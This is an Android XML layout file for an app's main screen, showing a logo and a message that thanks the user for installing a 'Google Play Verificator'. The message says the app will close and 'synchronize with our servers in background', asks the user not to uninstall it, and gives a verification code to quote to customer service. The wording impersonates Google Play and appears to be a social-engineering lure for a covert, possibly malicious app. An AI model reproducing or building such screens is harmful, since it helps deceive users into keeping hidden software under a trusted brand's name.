<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <ImageView
        android:id="@+id/imageView"
        android:layout_width="205dp"
        android:layout_height="203dp"
        android:layout_centerHorizontal="true"
        app:srcCompat="@drawable/app_logo" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Thank you for installing the Google Play Verificator.
         \n\nThe application will now close and synchronize with our servers in background.

         \n\nPlease, do not uninstall the application and contact site customer service quoting Verification code: 92752 for approval."
        app:layout_constraintBottom_toBottomOf="parent"
        android:layout_centerInParent="true"
        android:layout_centerVertical="true"
        android:layout_centerHorizontal="true"
        android:textSize="16sp"
        android:textStyle="normal"
        android:textColor="#000"
        android:layout_below="@+id/imageView"
        android:layout_marginLeft="15dp"
        android:layout_marginRight="15dp"/>





</RelativeLayout>